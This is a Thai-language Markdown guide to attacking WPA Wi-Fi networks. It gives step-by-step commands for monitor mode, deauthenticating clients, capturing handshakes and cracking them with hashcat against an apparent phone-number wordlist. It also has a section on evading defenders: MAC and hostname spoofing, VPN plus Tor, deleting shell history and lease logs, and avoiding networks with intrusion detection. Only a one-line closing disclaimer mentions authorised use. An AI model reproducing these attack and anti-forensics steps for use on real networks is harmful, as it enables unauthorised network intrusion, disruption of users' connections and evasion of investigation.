# 🔥 Wi-Fi Attack Lab + Red Team Survival Guide (Markdown)

## 🧭 สารบัญ
- [ภาพรวม Lab](#ภาพรวม-lab)
- [เครื่องมือที่ใช้](#เครื่องมือที่ใช้)
- [การตั้งค่าอะแดปเตอร์ให้พร้อมใช้งาน](#การตั้งค่าอะแดปเตอร์ให้พร้อมใช้งาน)
- [การปิด NetworkManager และวิธีกลับมาเปิด](#การปิด-networkmanager-และวิธีกลับมาเปิด)
- [การสแกน Wi-Fi และค้นหาเป้าหมาย](#การสแกน-wi-fi-และค้นหาเป้าหมาย)
- [การดักจับ Handshake](#การดักจับ-handshake)
- [การยิง deauth (ไล่ client ออกเพื่อดัก handshake)](#การยิง-deauth-ไล่-client-ออกเพื่อดัก-handshake)
- [การแปลงไฟล์ .cap เป็น .hccapx / .22000](#การแปลงไฟล์-cap-เป็น-hccapx--22000)
- [การ Brute-force ด้วย Hashcat บน Windows](#การ-brute-force-ด้วย-hashcat-บน-windows)
- [เทคนิคพรางตัวสำหรับ Attacker (Red Team)](#เทคนิคพรางตัวสำหรับ-attacker-red-team)
- [แนวทางการหลบการตามรอยจาก Blue Team](#แนวทางการหลบการตามรอยจาก-blue-team)
- [การกลับสู่โหมด Managed Mode](#การกลับสู่โหมด-managed-mode)

---

## 🧪 ภาพรวม Lab

- ใช้ Kali Linux เป็นเครื่องโจมตี (VM หรือเครื่องจริง)
- ใช้ USB Wi-Fi Adapter ที่รองรับ Monitor Mode & Packet Injection เช่น RTL8812AU
- เป้าหมาย: ดัก Handshake แล้ว Brute-force หา Password

---

## 🛠 เครื่องมือที่ใช้

| เครื่องมือ | หน้าที่ |
|------------|---------|
| `airmon-ng` | เปิด/ปิดโหมด monitor, ตรวจสอบ process ที่รบกวน |
| `airodump-ng` | สแกน Access Point และ Client |
| `aireplay-ng` | ยิง deauth (ไล่ Client ออก) |
| `hcxpcapngtool` | แปลง .cap → .22000 (ใช้แทน cap2hccapx) |
| `hashcat` | Brute-force password |
| `nmcli`, `iwconfig` | จัดการการ์ด Wi-Fi |
| `ip`, `ifconfig` | จัดการ IP, เปิด/ปิดอินเทอร์เฟส |

---

## 📡 การตั้งค่าอะแดปเตอร์ให้พร้อมใช้งาน

```bash
sudo ip link set wlan1 down
sudo iw dev wlan1 set type monitor
sudo ip link set wlan1 up
```

หรือใช้:
```bash
sudo airmon-ng start wlan1
```

### ✅ ความสามารถของ `airmon-ng` เพิ่มเติม

- ปิด process ที่รบกวน monitor mode อัตโนมัติ
- ตรวจสอบว่าอแดปเตอร์ใดรองรับ monitor ได้
- ใช้ `airmon-ng check kill` เพื่อล้าง process รบกวน

---

## 📴 การปิด NetworkManager และวิธีกลับมาเปิด

```bash
# ปิด
sudo systemctl stop NetworkManager.service
sudo systemctl disable NetworkManager.service

# เปิดกลับ
sudo systemctl enable NetworkManager.service
sudo systemctl start NetworkManager.service
```

---

## 🔍 การสแกน Wi-Fi และค้นหาเป้าหมาย

```bash
sudo airodump-ng wlan1
```

หากต้องการเจาะจง:
```bash
sudo airodump-ng --bssid <BSSID> --channel <CH> -w capture wlan1
```

---

## 🕵️ การดักจับ Handshake

1. ใช้ `airodump-ng` กับ `-w` เพื่อเก็บ `.cap`
2. รอให้ Client เชื่อมต่อหรือยิง deauth ให้หลุด
3. เช็คว่ามี `WPA handshake` มุมขวาบน

---

## 💥 การยิง deauth (ไล่ client ออกเพื่อดัก handshake)

```bash
sudo iwconfig wlan1 channel <CH>
sudo aireplay-ng --deauth 10 -a <BSSID> -c <Client MAC> wlan1
```

📌 **Note:** หากยิงแล้ว channel เพี้ยน ต้อง `Ctrl+C` ปิด `airodump-ng` ก่อน แล้วตั้ง channel ใหม่

---

## 🔄 การแปลงไฟล์ .cap เป็น .hccapx / .22000

### 📥 ติดตั้งเครื่องมือแปลง
```bash
sudo apt install hcxtools -y
```

### 🧪 คำสั่งแปลงไฟล์
```bash
# .cap → .22000
hcxpcapngtool -o boonta.22000 boonta.cap
```

> ⚠️ ใช้แทน cap2hccapx ที่เลิกใช้งานแล้ว

---

## 🧠 การ Brute-force ด้วย Hashcat บน Windows

```powershell
.\hashcat.exe -m 22000 -a 0 "D:\boonta.22000" "D:\084_phone.txt" -O --force
```

เช็คผล:
```powershell
.\hashcat.exe -m 22000 --show D:\boonta.22000
```

---

## 🕶 เทคนิคพรางตัวสำหรับ Attacker (Red Team)

| เทคนิค | รายละเอียด |
|--------|------------|
| 🧥 เปลี่ยน MAC | `macchanger -r wlan1` |
| 🪪 เปลี่ยน hostname | `hostnamectl set-hostname ghostmachine` |
| 🛡 ใช้ VPN + TOR | ซ้อนหลายชั้นเพื่อพราง IP จริง |
| 💾 ใช้ Live USB / VM | ไม่ให้มี Log บนเครื่อง |
| 🔒 ไม่ใช้ Wi-Fi บ้าน | หลีกเลี่ยง Wi-Fi ที่มี log |
| 🧽 ลบ Log | เช่น `.zsh_history`, `dhclient.leases` |
| 🚫 หลีกเลี่ยง Wi-Fi ที่มี IDS | อุปกรณ์บางรุ่นแจ้งเตือนการยิง deauth |

---

## 🚔 แนวทางการหลบการตามรอยจาก Blue Team

- เปลี่ยน MAC และ hostname ทุกครั้ง
- อย่าใช้ SSID หรือ Wi-Fi ที่ลงทะเบียนชื่อตัวเอง
- หลีกเลี่ยงอแดปเตอร์ภายใน (อาจโดน trace)
- หลีกเลี่ยงการยิง Wi-Fi หน่วยงานรัฐหรือ ISP

---

## 🔁 การกลับสู่โหมด Managed Mode (ใช้งานเน็ตปกติ)

```bash
# 1. ปิดโหมด monitor
sudo airmon-ng stop wlan1

# 2. ตั้งกลับเป็น managed
sudo ip link set wlan1 down
sudo iw dev wlan1 set type managed
sudo ip link set wlan1 up

# 3. เปิด NetworkManager (ถ้าปิดไว้)
sudo systemctl start NetworkManager.service
```

---

📌 **หมายเหตุ:** ทุกขั้นตอนต้องกระทำบน Wi-Fi ที่คุณมีสิทธิ์และเพื่อการศึกษาเท่านั้น!
